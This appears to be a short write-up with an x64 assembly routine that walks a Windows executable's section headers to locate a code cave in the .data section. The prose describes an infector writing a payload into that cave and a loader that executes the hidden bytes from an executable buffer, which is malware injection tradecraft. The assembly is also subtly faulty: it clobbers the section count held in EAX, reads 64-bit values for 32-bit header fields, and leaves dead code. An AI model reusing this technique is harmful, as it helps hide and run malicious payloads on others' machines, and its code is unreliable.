CaveWalker:

sectionWalk PROC

    mov eax, dword ptr [rcx+3Ch]    ; elfanew
    add rax, rcx                    ; rax = &IMAGE_NT_HEADERS

    movzx r8d, word ptr [rax + 14h] ; sizeOfOptionalHeader
    lea rdx, [rax + 18h]            ; start of optionalHeader 
    add rdx, r8                     ; first section

    ; rdx is first section
    
    mov cx, word ptr [rax + 6]      ; number of sections
    movzx eax, cx                   ; section count in eax

    xor r9d, r9d                    ; set to 0 for iteration        
    loopSections:

    cmp r9d, eax                    ; cmp to section count in eax
    je equalExit                    ; exit

    mov al, [rdx]
    cmp al, '.'
    je foundEntry                   ; if first 8 bits is . je cave finder

    add rdx, 28h                    ; move to next section
    inc r9d                         ; iterate num

    jmp loopSections                ; Looping back through

    equalExit:
    mov rax, rdx                    ; exit 
    ret

    foundEntry:

    mov al, [rdx+1]
    cmp al, 'd'                     ; .data often has slack space
    jne nextSection

    mov r13, [rdx+10h]              ; rawSize
    
    mov rax, [rdx+8h]               ; misc.size

    sub rax, r13                    ; misc.size - rawSize 

    mov r14, [rdx+14h]              ; Pointer to raw data

    add r14, r13                    ; add pointer to raw data + rawsize cave entry

    mov rax, r14

    ret
    jmp equalExit

    nextSection:
    add rdx, 28h                   ; add rdx + sizeof(IMAGE_SECTION_HEADER)
    inc r9d                        ; inc counter
    jmp loopSections

    sectionWalk ENDP
    END

  Passing in a Raw buffer into our sectionWalk function 
  allows us to output an integer, this is our codecave
  offset.
  
  Moving the file pointer to the location of the cave on 
  disk and writing to it allows us to store code that will
  not interfere with normal exection. 
  
  This left me with another thought, what if I were to make
  an exe that would read its own slack space on disk and 
  execute the raw bytes inside of a executable buffer.
  
  So I wrote a program that walks itself and executes the 
  data it finds within its own cave.
  
  This is the flow:
  
  Infector writes to codecave
                             \
                              > exe walks its own codecave
                                                          \
                                                           > Call code inside of new exectuable buffer
                                                           
  One thing to keep in mind is that the code must fit within
  this space. Meaning if you have a payload larger than the 
  slack space, your going to have to get that payload down to 
  a couple thousand bytes.
  
  This flow allows us to Infect our loader with a new payload
  each time, overwriting the previous one.
